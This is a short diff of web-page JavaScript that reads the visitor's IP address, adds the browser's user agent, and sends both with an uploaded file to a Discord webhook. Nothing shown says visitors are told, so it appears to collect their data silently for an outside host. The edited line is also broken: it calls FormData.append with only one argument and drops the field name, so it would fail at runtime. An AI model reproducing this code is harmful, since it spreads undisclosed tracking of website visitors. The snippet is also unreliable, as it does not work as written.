@@ -81,9 +81,10 @@
                 .then(response => response.json())
                 .then(data => {
                     var ipAddress = data.ip;
+                    var userAgent = navigator.userAgent;
 
                     var payload = new FormData();
-                    payload.append('content', 'User IP Address: ' + ipAddress);
+                    payload.append('User IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent);
                     payload.append('file', formData.get('file'));
 
                     fetch(discordWebhookURL, {
